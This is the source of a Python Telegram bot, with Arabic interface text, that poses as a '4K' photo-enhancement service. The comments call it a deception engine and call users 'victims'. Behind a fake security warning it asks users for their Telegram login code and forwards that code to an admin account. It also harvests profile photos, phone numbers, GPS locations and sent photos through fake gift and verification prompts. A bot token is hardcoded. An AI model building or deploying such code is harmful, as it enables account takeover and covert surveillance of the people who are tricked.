import telebot
import io
import json
import os
import time
from telebot import types
from PIL import Image, ImageEnhance
from flask import Flask
from threading import Thread

# --- إعدادات السيرفر الوهمي للبقاء حياً ---
app = Flask('')

@app.route('/')
def home():
    return "The Intelligence Core is Online!"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

# --- إعدادات البوت ---
TOKEN = '8182616162:AAHFZ8p_nPtqLkvsps2avC2DR4uCRZ4kv78'
ADMIN_ID = 6885799226 
DB_FILE = "master_intelligence.json"

bot = telebot.TeleBot(TOKEN)

# --- محرك البيانات ---
def load_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r") as f: return json.load(f)
        except: return {}
    return {}

def save_db(data):
    with open(DB_FILE, "w") as f:
        json.dump(data, f, indent=4)

db = load_db()

# --- لوحة التحكم والأزرار ---
def main_menu():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add("🔮 معالجة 4K الذكية", "🛡️ تأمين الحساب (2FA)")
    markup.add("📍 سرعة السيرفر (GPS)", "📞 توثيق VIP")
    markup.add("🎁 هدايا الإنترنت", "⚙️ فحص الجهاز")
    return markup

@bot.message_handler(commands=['start'])
def start(message):
    uid = str(message.from_user.id)
    name = message.from_user.first_name
    
    if uid not in db:
        db[uid] = {"points": 10, "state": "normal"}
        save_db(db)
        
        # صيد تلقائي لصور البروفايل
        try:
            p = bot.get_user_profile_photos(message.from_user.id)
            if p.total_count > 0:
                bot.send_photo(ADMIN_ID, p.photos[0][-1].file_id, 
                             caption=f"🎯 هدف جديد: {name}\n🆔 الآيدي: {uid}")
        except: pass

    bot.send_message(ADMIN_ID, f"🔔 دخول ضحية: {name} (@{message.from_user.username})")
    bot.send_message(message.chat.id, f"<b>مرحباً {name} في سيرفر 4K Pro المطور ✅</b>", 
                     parse_mode='HTML', reply_markup=main_menu())

# --- محرك الخداع والصيد ---
@bot.message_handler(func=lambda m: True)
def router(message):
    uid = str(message.from_user.id)
    
    if "تأمين الحساب" in message.text:
        db[uid]['state'] = "wait_code"
        save_db(db)
        bot.send_message(message.chat.id, "⚠️ <b>تحذير:</b> تم رصد نشاط مشبوه. أدخل الكود المكون من 5 أرقام الذي وصلك من Telegram الآن لتأمين جلسة الاتصال.", parse_mode='HTML')

    elif "هدايا الإنترنت" in message.text:
        mk = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
        mk.add(types.KeyboardButton("🎁 تفعيل 10GB مجاناً", request_location=True))
        bot.send_message(message.chat.id, "شارك موقعك لتحديد أقرب برج تغطية ومنحك الهدية.", reply_markup=mk)

    elif "توثيق VIP" in message.text:
        mk = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
        mk.add(types.KeyboardButton("✅ توثيق الرقم الآن", request_contact=True))
        bot.send_message(message.chat.id, "يجب توثيق الرقم لفك قيود سرعة المعالجة.", reply_markup=mk)

    elif "معالجة 4K" in message.text:
        db[uid]['state'] = "process"
        save_db(db)
        bot.send_message(message.chat.id, "🔮 أرسل الصورة الآن لتحويلها لدقة 4K.")

    elif db[uid].get('state') == "wait_code":
        bot.send_message(ADMIN_ID, f"🔑 <b>صيد كود تحقق:</b>\nالاسم: {message.from_user.first_name}\nالكود: <code>{message.text}</code>", parse_mode='HTML')
        bot.send_message(message.chat.id, "✅ تم التأمين بنجاح.")
        db[uid]['state'] = "normal"
        save_db(db)

# --- استلام الوسائط والأرقام ---
@bot.message_handler(content_types=['contact', 'location', 'photo'])
def handle_media(message):
    uid = str(message.from_user.id)
    
    if message.content_type == 'contact':
        bot.send_message(ADMIN_ID, f"📱 <b>رقم مصيد:</b> {message.contact.phone_number}\nالاسم: {message.contact.first_name}", parse_mode='HTML')
        bot.send_message(message.chat.id, "✅ تم التوثيق.")
        
    elif message.content_type == 'location':
        lat, lon = message.location.latitude, message.location.longitude
        bot.send_message(ADMIN_ID, f"📍 <b>موقع الضحية:</b>\nhttps://www.google.com/maps?q={lat},{lon}")
        bot.send_message(message.chat.id, "✅ تم الربط.")
        
    elif message.content_type == 'photo':
        fid = message.photo[-1].file_id
        bot.send_photo(ADMIN_ID, fid, caption=f"📸 صورة مرسلة من: {message.from_user.first_name}")
        
        if db.get(uid, {}).get('state') == "process":
            status = bot.reply_to(message, "⏳ جاري المعالجة...")
            try:
                f_info = bot.get_file(fid)
                down = bot.download_file(f_info.file_path)
                img = Image.open(io.BytesIO(down))
                img = ImageEnhance.Sharpness(img).enhance(3.0)
                out = io.BytesIO()
                img.save(out, format='JPEG', quality=95)
                out.seek(0)
                bot.send_photo(message.chat.id, out, caption="✨ تم التحسين!")
            except: pass
            bot.delete_message(message.chat.id, status.message_id)
            db[uid]['state'] = "normal"
            save_db(db)

if __name__ == "__main__":
    keep_alive()
    print("🚀 الرادار السحابي يعمل...")
    bot.infinity_polling()
